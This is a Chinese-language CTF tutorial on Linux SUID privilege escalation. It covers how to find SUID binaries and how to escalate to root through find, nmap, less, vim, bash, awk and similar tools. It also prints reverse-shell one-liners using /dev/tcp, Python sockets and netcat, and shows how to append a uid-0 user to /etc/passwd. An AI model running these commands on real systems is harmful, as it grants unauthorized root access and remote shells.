# Linux suid提权

## 前言

打春秋杯以及复现NewStarCTF时的时候设计到了linux suid提权，这里一块总结一下。

## 什么是suid

suid(set
uid)是linux中的一种特殊权限，suid可以让调用者以文件拥有者身份运行该文件，所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。

suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。

linux引入了3个文件来管理用户组：

  1. /etc/passwd存放用户信息。

  2. /etc/shadow存放用户密码信息。

  3. /etc/group存放组信息。

在文件系统中的每个文件的文件头里面添加了用户和文件之间的关系信息。

用户信息/etc/passwd每行共有7个字段冒号隔开：

字段1为用户名。

字段2为用户的密码。

字段3为指UID，每个用户都有自己的uid。

字段4为组UID，每个用户都有不同的uid。

字段5为解释说明的字段。

字段6为指用户的根目录。

字段7为指登录shell，用户登录shell，当前为/bin/zsh表示可以登录，/sbin/nologin标识不被授权登录。

![](./img/7632813193444504395.png)

## 如何利用

在执行过程中，调用者会暂时获得该文件的所有者权限，且该权限只在程序执行的过程中有效。

只有root用户的uid是0，如果把一个普通用户的uid修改为0，那么只要以普通用户的用户名和密码登录系统就会自动切换到root用户，在系统加固时一定要找出有哪些用户的uid为0。

假设可执行文件binexec其属主为root，当以非root身份登录时，如binexec设置了suid权限，就可以在非root身份下运行该可执行文件，可执行文件运行时该进程的权限为root权限。

利用此特性，就可通过suid进行提权。

## 如何设置suid

利用

    
    
    chmod u+s filename #设置suid
    chmod u-s filename #去除suid

![](./img/5571232523624452298.png)

可以看见，我们示例的图片由 -rw变为了-rwS,所以就是添加上了suid权限

## 如何查找suid文件

具有suid权限的二进制可执行文件有：

    
    
    nmap
    vim
    find
    bash
    more
    less
    nano
    cp
    awk

从网上找了几个常见的命令

更多有关suid的可以看[GTFOBins](https://gtfobins.github.io/)

    
    
    find / -user root -perm -4000 -print 2>/dev/null
    find / -perm -u=s -type f 2>/dev/null
    find / -user root -perm -4000 -exec ls -ldb {} \;

以find / -perm -u=s -type f 2>/dev/null讲解一下各个参数代表什么

    
    
    find / -perm -u=s -type f 2>/dev/null
    /表示从文件系统的顶部（根）开始并找到每个目录
    -perm 表示搜索随后的权限
    -u = s表示查找root用户拥有的文件
    -type表示我们正在寻找的文件类型
    f 表示常规文件，而不是目录或特殊文件
    2表示该进程的第二个文件描述符，即stderr（标准错误）
    >表示重定向
    /dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。

![](./img/8386530681397961236.png)

利用以上这几个命令可以找到正在系统上运行的所有suid可执行文件。

也可以使用sudo -l 列出当前用户可执行的命令

举个例子，我这里用Newstar的靶机演示了

    
    
    find / -user root -perm -4000 -exec ls -ldb {} \;

![](./img/7346443758620543234.png)

ls一下看看是否设置了suid权限

    
    
    ls -al /usr/bin/su

![](./img/8623453400476854729.png)

可以看到确实设置了suid权限，而且属主为root，现在我们是不是可以利用我们之前提到的suid可执行二进制文件从而进行提权呢

## 进行suid提权

**这里的前提都是要有suid权限**

### find

    
    
    find 具有suid权限的filename -exec whoami \; -quit
    #root
    find 具有suid权限的filename -exec /bin/sh -p \; -quit
    #whoami
    #root

![](./img/5489332258674475921.png)

还有一种差不多的提权方法

    
    
    #先前利用以上查找suid文件查询到了/usr/bin/find 有suid权限
    touch 1.txt #创建1.txt
    /usr/bin/find 1.txt -exec whoami \;

![](./img/6387160612270006689.png)

广播shell

在靶机上：

    
    
    find user -exec nc -lvp 4444 -e '/bin/sh' \;

在攻击机上：

    
    
    nc 靶机ip 4444

反弹shell

在靶机上:

    
    
    find 具有suid权限的filename -exec bash -c 'bash -i >& /dev/tcp/ip/port 0>&1' \;

在攻击机上：

    
    
    nc -lvp port

![](./img/5522598852212851616.png)

这里我延申一下，也可以写一个反弹root的shell

    
    
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    
    
    nc -lvp port

![](./img/2544497501993056210.png)

这里也可以结合之前的命令

    
    
    /usr/bin/find 1.txt -exec python -c  'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' \;

### nmap

适用版本：nmap2.02至5.21。

nmap是一个经典的端口扫描工具，当目标主机存在版本在2.02-5.21之间的nmap且os的版本在上面受影响的范围内或更早就可以尝试使用这种方法进行提权。

在早期的nmap版本，是可以利用

    
    
    nmap --interactive

进入交互模式的，所以就可以执行shell命令，我这里的nmap是7.92版本的，没法复现，就说一下吧。

首先是进入nmap交互模式

    
    
    nmap --interactive

之后利用命令进行提权

    
    
    nmap> !sh
    
    sh-3.2# whoami
    root

之后看P神的博客，发现其实现在也可以利用nmap执行shell命令，但是好像不能提权，这里说一下吧

首先我们要写一个nmap的nse脚本,命名为1.nse

    
    
    os.execute('/bin/sh')

之后里面nmap命令

    
    
    nmap --script=1.nse

![](./img/2039525789929137625.png)

但是还是执行的普通用户的shell命令，所以我们利用nse脚本也只能仅仅实现nmap在高版本的交互界面

### less/more

less/more这两个命令差不多，就拿less命令进行讲解了

众所周知，less也是一种查看文件的命令，但是我们也可以利用less进行执行我们的shell命令

    
    
    less /etc/passwd

之后进入交互界面，输入

    
    
    !/bin/sh

![](./img/1549935372632116901.png)

    
    
    VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
    v
    
    
    less /etc/profile
    v:shell

也是可以进入交互界面然后写入shell的

如果二进制文件设置了 SUID 位，则它不会丢弃提升的权限，并且可能会被滥用来访问文件系统、升级或维护作为 SUID
后门的特权访问。如果它用于运行，则省略像 Debian （<= Stretch） 这样的系统上允许默认 shell 以 SUID 权限运行的参数。`sh
-p``-p``sh`

此示例创建二进制文件的本地 SUID 副本并运行它以维护提升的权限。要与现有 SUID 二进制文件交互，请跳过第一个命令并使用其原始路径运行程序。

    
    
    sudo install -m =xs $(which less) .
    
    ./less file_to_read

PS：使用more和less一定读取一个比较大的文件，如果文件太小无法进入翻页功能，无法使用`!`命令进入shell。

### nano

利用nano这种比较古老的文本编辑器进入shell交互界面就比较简单了

    
    
    nano
    ctrl + R
    ctrl + X
    #shell

![](./img/5428030127877772677.png)

### cp/mv

据我了解cp和mv覆盖方式是差不多的，这里以cp进行详解

主要是利用cp命令覆盖/etc/passwd从而进行提权，这里我看了一下网上都没有写主要步骤的，都是搪塞了过去，我这里研究了一下原理，写一下我的cp覆盖过程

    
    
    whoami
    #qszd
    
    
    cat /etc/passwd
    
    
    openssl passwd -1 -salt test testaaa
    
    
    echo 'test:$1$test$giCVmzusADSPMon2mwEWo1:0:0::/root/:/bin/sh' >> passwd
    
    
    echo 'test:$1$test$giCVmzusADSPMon2mwEWo1:0:0::/root/:/bin/sh' >> passwd
    
    
    su - test

![](./img/7810458318727273996.png)

### vi/vim

vi命令和vim差不多，这里就用vim命令进行详解

首先是一种比较特殊的情况，就是vim被配置了suid权限，所以只有root才能有权限进行读写，这种时候就是

    
    
    vim.tiny /etc/passwd
    
    
    :!/bin/sh

![](./img/1407526808249045452.png)

### bash

bash命令有的靶机是设置了suid权限的，有的没有设置suid权限

我的靶机没有设置suid权限，这里就口头描述一下

    
    
    id
    #uid=1024(qsdz) gid=999(qsdz) groups=999(qsdz)
    
    
    bash -p
    #生成一个  bash-3.2#
    
    
    bash-3.2# id
    #uid=1024(qsdz) gid=999(qsdz) euid=0(root) groups=999(qsdz)

### awk

awk利用以下命令进入shell，其原理和上面的bash差不多

    
    
    awk 'BEGIN {system("/bin/bash")}'
    
    
    bash-3.2$ whoami
    #root

### 一些奇奇怪怪的提权

#### 通过查询历史记录从而获得信息泄露的信息

利用以下命令可以获取

    
    
    cat ~/.bash_history

这个命令可以查看当前用户使用过的历史命令

有可能会得到root登录的密码

![](./img/5764997497648090012.png)

#### 计划任务提权

可以利用

    
    
    ls -l /etc/cron*

查看定期执行的计划任务，如果有用户写的脚本，那么我们可以进行脚本的修改然后回连rootshell，从而提权

![](./img/6856249660910859571.png)

#### linux配置错误从而提权

利用linuxprivchecker：<https://www.securitysift.com/download/linuxprivchecker.py>

**unix-privesc-check** ：<http://pentestmonkey.net/tools/audit/unix-privesc-check>

这两个工具进行查找linux中配置错误的文件

# 参考

[对Linux|suid提权的一些总结 -FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/288129.html)

